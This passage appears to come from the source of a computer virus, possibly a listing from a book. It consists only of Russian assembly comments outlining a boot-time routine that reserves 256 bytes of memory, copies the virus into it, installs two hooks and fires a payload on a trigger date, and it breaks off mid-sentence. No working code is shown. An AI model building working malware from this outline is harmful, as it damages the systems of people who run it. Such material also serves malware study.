; Часть, работающая в момент загрузки системы.
; Назначение: захватить 256 байт памяти для размещения вируса,
; переписать туда весь вирус, подключить ловушки Hook и Hook2
; и вернуться. Если дата равна дате срабатывания, вызвать полезный
